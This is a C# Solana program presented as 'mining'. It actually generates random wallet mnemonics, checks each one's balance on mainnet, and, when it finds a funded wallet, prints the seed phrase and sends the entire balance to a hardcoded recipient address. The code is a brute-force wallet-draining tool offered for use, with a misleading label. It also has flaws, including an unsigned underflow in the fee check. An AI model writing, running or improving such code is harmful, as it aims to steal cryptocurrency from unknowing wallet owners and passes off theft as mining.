using Solnet.Programs;
using Solnet.Rpc;
using Solnet.Wallet.Bip39;
using Solnet.Wallet;
using Solnet.Rpc.Builders;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Solnet.Rpc.Core.Http;
using Solnet.Rpc.Messages;

class Program
{
    private static readonly List<string> RpcEndpoints = new List<string>
    {
        "https://api.mainnet-beta.solana.com", // Solana Mainnet (public)
        //"https://solana-api.projectserum.com",  // Project Serum RPC
        //"https://ssc-dao.genesysgo.net",       // GenesysGo RPC
        //"https://api.metaplex.solana.com"      // Metaplex RPC
    };

    private static int _endpointIndex = 0;

    static async Task Main(string[] args)
    {
        Console.WriteLine("Hello, Solana!");
        Console.Write("Start mining by pressing any key...");
        Console.ReadLine();
        Console.WriteLine("Mining...");

        while (true)
        {
            for (int i = 1; i > 0; i++)
            {
                // Generate a new wallet
                var wallet = GenerateWallet();
                string publicKey = wallet.Account.PublicKey;

                // Log progress
                if (i % 200 == 0)
                {
                    Console.WriteLine($"Try {i}");
                }

                // Check balance
                var balanceResponse = await GetBalanceAsync(publicKey);
                if (balanceResponse?.Result?.Value != null && balanceResponse.Result.Value > 0)
                {
                    Console.WriteLine($"💰 Balance: {balanceResponse.Result.Value} lamports for wallet: {publicKey} | {wallet.Mnemonic}");

                    // Transfer funds if balance is sufficient
                    await TransferFundsAsync(wallet, balanceResponse.Result.Value);
                    break;
                }
            }
        }
    }

    private static Wallet GenerateWallet()
    {
        var newMnemonic = new Mnemonic(WordList.English, WordCount.Twelve);
        return new Wallet(newMnemonic.ToString());
    }

    private static async Task<RequestResult<ResponseValue<ulong>>> GetBalanceAsync(string publicKey)
    {
        var rpcClient = ClientFactory.GetClient(RpcEndpoints[_endpointIndex]);
        _endpointIndex = (_endpointIndex + 1) % RpcEndpoints.Count; // Cycle through endpoints

        try
        {
            return await rpcClient.GetBalanceAsync(publicKey);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"❌ Error with endpoint {RpcEndpoints[_endpointIndex]}: {ex.Message}");
            return null;
        }
    }

    private static async Task TransferFundsAsync(Wallet wallet, ulong balanceLamports)
    {
        var rpcClient = ClientFactory.GetClient(RpcEndpoints[_endpointIndex]);

        // Fetch the latest block hash
        var blockHashResponse = await rpcClient.GetLatestBlockHashAsync();
        if (!blockHashResponse.WasSuccessful)
        {
            Console.WriteLine("❌ Failed to fetch latest block hash.");
            return;
        }
        string blockHash = blockHashResponse.Result.Value.Blockhash;
        Console.WriteLine($"🔎 Blockhash: {blockHash}");

        // Calculate transfer amount (deduct transaction fee)
        ulong feeLamports = 5000; // Approximate fee for a simple transaction
        ulong transferAmount = balanceLamports - feeLamports;

        if (transferAmount <= 0)
        {
            Console.WriteLine("❌ Insufficient balance to cover transaction fee.");
            return;
        }

        // Define sender and receiver
        PublicKey fromAccount = wallet.Account.PublicKey;
        PublicKey toAccount = new PublicKey("HLoFoaF5AQeJ7xTXXb1FXtDbyuB7MoBm9k9AXzN38juB");

        // Build transaction
        var tx = new TransactionBuilder()
            .SetRecentBlockHash(blockHash)
            .SetFeePayer(fromAccount)
            .AddInstruction(MemoProgram.NewMemo(fromAccount, "Hello from Sol.Net :)"))
            .AddInstruction(SystemProgram.Transfer(fromAccount, toAccount, transferAmount))
            .Build(wallet.Account); // Sign the transaction

        // Send transaction
        var sendResponse = await rpcClient.SendTransactionAsync(tx);
        if (sendResponse.WasSuccessful)
        {
            Console.WriteLine($"✅ Transaction Sent! Signature: {sendResponse.Result}");
        }
        else
        {
            Console.WriteLine($"❌ Transaction Failed: {sendResponse.Reason}");
            Console.WriteLine($"❌ Full Response: {sendResponse.RawRpcResponse}");
        }
    }
}